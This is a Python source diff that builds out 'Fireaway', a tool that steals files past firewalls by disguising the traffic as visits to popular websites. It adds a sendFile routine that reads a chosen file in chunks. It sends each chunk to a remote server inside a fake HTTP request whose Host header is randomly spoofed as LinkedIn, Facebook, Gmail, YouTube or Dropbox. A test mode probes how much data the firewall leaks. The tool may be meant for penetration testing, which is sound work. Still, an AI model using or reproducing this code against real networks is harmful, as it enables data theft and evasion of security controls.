@@ -4,7 +4,7 @@ import socket
 import sys
 import string
 from random import choice
-
+from random import randint
 
 def main():
     if len(sys.argv) != 4 or sys.argv[2].isdigit == False or int(sys.argv[2]) < 1 or int(sys.argv[2]) > 65535 or \
@@ -20,6 +20,7 @@ def main():
 
 
 def testChunk(server, port):
+    apps = ['www.linkedin.com','www.facebook.com','www.gmail.com','www.youtube.com', 'www.dropbox.com']
     while True:
         try:
             startBytes = int(raw_input('Enter the number initial number of bytes to test: '))
@@ -47,17 +48,17 @@ def testChunk(server, port):
     curBytes = startBytes
 
     while curBytes < int(maxBytes):
+        spoofedApp = apps[randint(0,len(apps)-1)]
         try:
             testData = ''.join(choice(string.ascii_letters + string.digits + '!@#$%^&*()') for x in range(curBytes))
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(15)
             s.connect((server, port))
-            print 'sending ' + str(curBytes) + ' of test data.  Watch the server to see how much is received.'
-            s.send("GET / HTTP/1.1\nHost:www.gmail.com\nUser-Agent:Mozilla/5.0 (Windows NT 6.1)\nConnection:close\n\n" + testData)
+            print 'sending ' + str(curBytes) + ' bytes of test data disguised as ' + spoofedApp.split('.')[1] +   '.  Watch the server to see how much is received.'
+            s.send('GET / HTTP/1.1\nHost: ' + spoofedApp + '\nUser-Agent:Mozilla/5.0 (Windows NT 6.1)\nConnection:close\n\n' + testData)
             s.close()
 
         except Exception,e:
-	    print e
             # Handle aggressive network traffic from the firewall gracefully and keep going.
             pass
 
@@ -71,16 +72,40 @@ def testChunk(server, port):
         sys.exit()
 
 def sendFile(server, port):
-    sourceFile = raw_input('Enter filename to send: ')
-    pieceSize = raw_input('Enter chunk size to send (be sure to account for app spoofing size: ')
-    
-    with open (sourceFile) as f:
-        print 'App spoof'
+    sourceFile = raw_input('Enter filename to exfiltrate: ')
+    pieceSize = int(raw_input('Enter chunk size to send (be sure to account for app spoofing size): '))
+    apps = ['www.linkedin.com', 'www.facebook.com', 'www.gmail.com', 'www.youtube.com', 'www.dropbox.com']
+    chunkCount = 1
+
+    with open (sourceFile,'rb') as f:
+        while True:
+            piece = f.read(pieceSize)
+
+            if piece == "":
+                break  # EOF
+
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(15)
+
+            try:
+                spoofedApp = apps[randint(0,len(apps)-1)]
+                s.connect((server, port))
+                print 'Sending chunk ' + str(chunkCount) + ' spoofed as ' + spoofedApp.split('.')[1]
+                s.send('GET / HTTP/1.1\nHost: ' + spoofedApp + '\nUser-Agent:Mozilla/5.0 (Windows NT 6.1)\nConnection:close\n\n' + piece)
+                s.close()
+                chunkCount += 1
+
+            except:
+                # Handle aggressive network traffic from the firewall and keep going
+                print 'Got something bad back.  Going to plug on...'
+                pass
+
+    print 'Finished sending file.  Check ReceivedData.txt on the server for results.'
     
 
 
 def printHelp():
-    print 'Fireaway Exfiltration Spoofer v0.1'
+    print 'Fireaway App Spoofer and Exfil v0.1'
     print 'Usage:  fa_spoof <fa_server IP> <port> <mode>'
     print 'Valid options for mode:'
     print '0-Send random test data to find maximum leaked data fragment size'
